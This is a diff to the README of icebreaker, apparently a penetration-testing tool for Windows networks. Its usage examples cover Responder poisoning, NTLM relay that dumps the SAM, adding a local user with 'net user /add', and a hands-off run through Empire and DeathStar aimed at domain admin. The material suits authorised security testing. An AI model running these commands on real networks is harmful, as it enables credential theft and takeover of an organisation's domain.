@@ -81,15 +81,16 @@ Read from a newline separated list of IP addresses (single IPs or CIDR ranges) a
 
 ```./icebreaker -l targets.txt -c "net user /add User1 P@ssw0rd"```
 
-Read from a hostlist, tell Responder to use the eth0 interface rather than the default gateway interface, and let Responder run for 30m instead of the usual 10m
+Read from a hostlist, tell Responder to use the eth0 interface rather than the default gateway interface, let Responder run for 30m instead of the usual 10m, and run the default ntlmrelayx post-relay commands to dump the SAM off the victim server
 
-```./icebreaker -l targets.txt -i eth0 -t 30```
+```./icebreaker -l targets.txt -i eth0 -t 30 -c default```
 
 Use an Nmap XML output file, skip all five attacks plus don't autocrack hashes, and use a custom password list for the reverse bruteforce attack (note that since this example is skipping attack 1 via '-s rid' the password list specified won't even get used; this is just used as an example) 
 
 ```./icebreaker.py -x nmapscan.xml -s rid,scf,llmnr,relay,dns,crack -p /home/user/password-list.txt```
 
-Fire-and-forget usage: input targets file, scrape companydomain.com for email usernames to be added to the reverse bruteforce attack, skip mitm6's IPv6 DNS poisoning, and run Empire and DeathStar in either tmux or xterm windows once attack 4 starts in order to gain automated domain admin. The goal of this usage is to fire off the command Monday at 9am then go take a short, uninterrupted break until Friday at 5pm. We skip attack 5 (mitm6) because it can sometimes cause network issues and we don't want angry clients interrupting our hard-earned break.
+Fire-and-forget usage: input targets file, scrape companydomain.com for email usernames to be added to the reverse bruteforce attack, skip mitm6's IPv6 DNS poisoning, and run Empire and DeathStar in either tmux or xterm windows once attack 4 starts in order to gain automated domain admin. The goal of this usage is to fire off the command Monday at 9am then go take a short, uninterrupted break until Friday at 4:30pm at which point we come back to a domain admin shell waiting for us. We skip attack 5 (mitm6) because it can sometimes cause network issues and we don't want angry clients interrupting our hard-earned break.
+
 
 ```./icebreaker.py -l targets.txt -d companydomain.com -s dns --auto [tmux/xterm]```
 
